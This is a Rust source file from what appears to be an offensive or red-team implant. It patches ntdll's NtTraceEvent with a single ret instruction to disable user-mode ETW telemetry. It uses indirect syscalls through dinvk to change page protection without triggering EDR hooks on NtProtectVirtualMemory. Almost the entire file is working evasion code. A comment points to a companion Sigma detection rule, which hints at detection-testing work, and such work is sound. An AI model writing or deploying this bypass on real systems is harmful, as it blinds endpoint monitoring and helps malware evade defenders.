//! ETW bypass: patch NtTraceEvent with 0xC3 (ret) to kill user-mode ETW telemetry.
//!
//! Uses indirect syscall via dinvk::syscall! to call NtProtectVirtualMemory
//! without triggering the user-mode hook that EDR installs on that function.
//!
//! Scope: kills user-mode ETW providers only. Kernel-mode ETW (ETWTI Threat
//! Intelligence provider) is unaffected — that path requires kernel-mode code.
//!
//! Detection: Sysmon/EDR process_tampering event (ntdll .text page RWX change).
//! The matching Sigma rule is in detection/sigma/evasion_etw_patch.yml.

use core::ffi::c_void;
use dinvk::winapis::NT_SUCCESS;

use super::peb;

/// Patch NtTraceEvent in the current process's ntdll.dll copy with a single
/// ret (0xC3), disabling all user-mode ETW event emission.
///
/// # Safety
/// Writes to ntdll .text section. Safe to call multiple times (idempotent).
/// Must NOT be called from multiple threads simultaneously.
pub unsafe fn bypass() {
    // 1. Resolve NtTraceEvent VA via our PEB walk (no GetProcAddress call).
    let ntdll = match peb::find_module("ntdll.dll") {
        Some(base) => base,
        None => return, // ntdll always loaded; this branch is unreachable in practice
    };

    let target = match peb::resolve_export(ntdll, b"NtTraceEvent") {
        Some(va) => va as *mut u8,
        None => return,
    };

    // 2. Make the target page writable via NtProtectVirtualMemory.
    //    dinvk::syscall! uses Tartarus Gate SSN resolution + indirect syscall dispatch,
    //    bypassing any user-mode hook on NtProtectVirtualMemory itself.
    let mut region_base = target as *mut c_void;
    let mut region_size: usize = 1;
    let mut old_protect: u32 = 0;

    let status = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),   // pseudo-handle = -1
        &mut region_base as *mut *mut c_void,
        &mut region_size as *mut usize,
        0x40u32,                              // PAGE_EXECUTE_READWRITE
        &mut old_protect as *mut u32
    );

    if status.map(NT_SUCCESS) != Some(true) {
        return;
    }

    // 3. Write the ret patch.
    core::ptr::write_volatile(target, 0xC3u8);

    // 4. Restore original page protection.
    let mut region_base2 = target as *mut c_void;
    let mut region_size2: usize = 1;
    let mut dummy: u32 = 0;
    // Ignore restore failure — the patch is already written.
    // Leaving the page RWX is a minor exposure; rolling back the patch would be worse.
    let _ = dinvk::syscall!(
        "NtProtectVirtualMemory",
        dinvk::winapis::NtCurrentProcess(),
        &mut region_base2 as *mut *mut c_void,
        &mut region_size2 as *mut usize,
        old_protect,
        &mut dummy as *mut u32
    );
}

#[cfg(test)]
mod tests {
    #[test]
    fn compiles_on_host() {
        // Verifies the module compiles on the Linux cross-compile host.
        // The etw module is cfg-gated to Windows in mod.rs so no implementation
        // code runs here; runtime behavior is tested manually on a Windows target.
    }
}
